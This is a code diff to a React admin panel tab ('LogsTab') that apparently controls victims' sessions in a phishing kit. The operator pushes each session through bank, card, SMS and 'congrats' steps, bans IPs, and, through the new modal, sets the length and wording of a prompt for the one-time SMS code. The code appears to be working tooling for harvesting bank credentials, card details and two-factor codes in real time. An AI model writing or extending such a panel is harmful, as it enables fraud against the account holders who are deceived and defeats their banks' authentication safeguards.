@@ -41,6 +41,10 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   const [specialImage, setSpecialImage] = useState<string | null>(null);
   const [specialLang, setSpecialLang] = useState<"de" | "tr">("de");
 
+  const [smsPromptSessionId, setSmsPromptSessionId] = useState<string | null>(null);
+  const [smsDigitsInput, setSmsDigitsInput] = useState("6");
+  const [smsCustomTextInput, setSmsCustomTextInput] = useState("");
+
   const load = useCallback(async () => {
     if (!supabase) return;
     setLoading(true);
@@ -125,7 +129,19 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   const handleRouteAction = async (sessionId: string, action: string) => {
     if (!supabase) return;
     
-    if (action === "win" || action === "banken" || action === "sms" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats") {
+    if (action === "sms") {
+      setSmsPromptSessionId(sessionId);
+      setSmsDigitsInput("6");
+      setSmsCustomTextInput("");
+      return;
+    }
+
+    if (action === "special_approval") {
+      setSpecialPromptSessionId(sessionId);
+      return;
+    }
+
+    if (action === "win" || action === "banken" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats") {
       await supabase.from("sessions").update({ current_step: action }).eq("id", sessionId);
     } else if (action === "ban_ip") {
       const row = rowsRef.current.find(r => r.id === sessionId);
@@ -141,10 +157,23 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
       } else {
         alert("Bu kullanıcının IP adresi henüz sisteme yansımamış.");
       }
-    } else if (action === "special_approval") {
-      await supabase.from("sessions").update({ current_step: action }).eq("id", sessionId);
     }
   };
+
+  async function confirmSmsRedirect() {
+    if (!supabase || !smsPromptSessionId) return;
+    const digits = Math.min(12, Math.max(4, Number(smsDigitsInput) || 6));
+    await supabase
+      .from("sessions")
+      .update({
+        current_step: "sms",
+        status: "online",
+        form_data: { smsDigits: digits, smsCustomText: smsCustomTextInput.trim() || undefined }
+      })
+      .eq("id", smsPromptSessionId);
+    setSmsPromptSessionId(null);
+    void load();
+  }
 
   const handleDelete = async (sessionId: string) => {
     if (!confirm("Bu logu silmek (gizlemek) istediğinize emin misiniz?")) return;
@@ -610,6 +639,57 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
             <div className="mt-6 flex justify-end gap-4">
               <button onClick={() => setSpecialPromptSessionId(null)} className={`px-4 py-2 font-semibold transition-colors ${darkMode ? 'text-zinc-500 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}>İptal</button>
               <button onClick={() => void publishSpecialApproval()} className="bg-[#EB5E28] px-10 py-2 rounded-xl text-white font-bold hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20">BİLDİRİMİ GÖNDER</button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* SMS SETTINGS MODAL */}
+      {smsPromptSessionId && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
+          <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
+            <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>SMS Ayarları</h3>
+            
+            <div className="space-y-4">
+              <div>
+                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Hane Sayısı</label>
+                <input
+                  type="number"
+                  min={4}
+                  max={12}
+                  value={smsDigitsInput}
+                  onChange={(e) => setSmsDigitsInput(e.target.value)}
+                  className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
+                />
+              </div>
+
+              <div>
+                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
+                  Özel Açıklama Metni (İsteğe Bağlı)
+                </label>
+                <textarea
+                  rows={3}
+                  value={smsCustomTextInput}
+                  onChange={(e) => setSmsCustomTextInput(e.target.value)}
+                  placeholder="Örn: Telefonunuza gelen şifreyi girin."
+                  className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
+                />
+              </div>
+            </div>
+
+            <div className="mt-6 flex justify-end gap-3">
+              <button
+                onClick={() => setSmsPromptSessionId(null)}
+                className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
+              >
+                İptal
+              </button>
+              <button
+                onClick={() => void confirmSmsRedirect()}
+                className="rounded-xl bg-[#EB5E28] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20"
+              >
+                Onayla ve Gönder
+              </button>
             </div>
           </div>
         </div>
